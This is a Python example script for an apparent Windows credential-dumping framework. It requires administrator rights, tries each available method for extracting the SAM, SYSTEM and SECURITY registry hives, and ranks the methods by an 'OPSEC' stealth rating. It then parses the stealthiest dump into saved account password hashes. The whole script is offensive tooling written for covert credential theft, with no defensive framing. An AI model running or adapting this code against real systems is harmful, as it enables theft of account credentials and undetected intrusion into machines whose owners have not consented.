#!/usr/bin/env python3
"""
Example: Compare Extraction Methods
Test and compare different extraction techniques
"""

from sam_extractor import SAMExtractor
import time

def main():
    """Compare methods example"""
    print("[*] Example: Compare Extraction Methods")
    print("="*60)
    
    # Initialize framework
    extractor = SAMExtractor(output_dir="example_dumps")
    
    # Check privileges
    if not extractor.check_privileges():
        print("[!] This example requires administrator privileges")
        return 1
    
    # Get available methods
    available = extractor.list_available_methods()
    
    if not available:
        print("[-] No extraction methods available")
        return 1
    
    print(f"\n[*] Testing {len(available)} available methods...")
    
    results = []
    
    # Test each available method
    for method in available:
        print(f"\n{'='*60}")
        print(f"Testing method: {method.upper()}")
        print(f"{'='*60}")
        
        # Track execution time
        start_time = time.time()
        
        result = extractor.extract(method)
        
        elapsed = time.time() - start_time
        
        if result:
            results.append({
                'method': method,
                'success': True,
                'time': elapsed,
                'opsec': result['opsec_rating'],
                'files': result
            })
            
            print(f"[+] {method}: SUCCESS")
            print(f"    Time: {elapsed:.2f} seconds")
            print(f"    OPSEC: {result['opsec_rating']}")
        else:
            results.append({
                'method': method,
                'success': False,
                'time': elapsed
            })
            
            print(f"[-] {method}: FAILED")
    
    # Summary
    print(f"\n{'='*60}")
    print(f"COMPARISON SUMMARY")
    print(f"{'='*60}")
    
    print(f"Methods tested: {len(available)}")
    print(f"Successful: {sum(1 for r in results if r['success'])}")
    print(f"Failed: {sum(1 for r in results if not r['success'])}")
    
    if any(r['success'] for r in results):
        print(f"\nSuccessful methods:")
        for result in results:
            if result['success']:
                print(f"  ✓ {result['method']}")
                print(f"    Time: {result['time']:.2f}s")
                print(f"    OPSEC: {result['opsec']}")
        
        # Parse the best result (highest OPSEC)
        best = max(
            [r for r in results if r['success']],
            key=lambda x: {'Very High': 4, 'High': 3, 'Medium': 2, 'Low': 1}.get(x['opsec'], 0)
        )
        
        print(f"\n[*] Parsing best result: {best['method']} (OPSEC: {best['opsec']})")
        
        credentials = extractor.parse_hives(
            best['files']['sam'],
            best['files']['system'],
            best['files'].get('security'),
            save_hashes=True
        )
        
        if credentials:
            print(f"[+] Extracted {len(credentials)} account hashes")
        
        return 0
    else:
        print("\n[-] All methods failed")
        return 1


if __name__ == '__main__':
    import sys
    sys.exit(main())
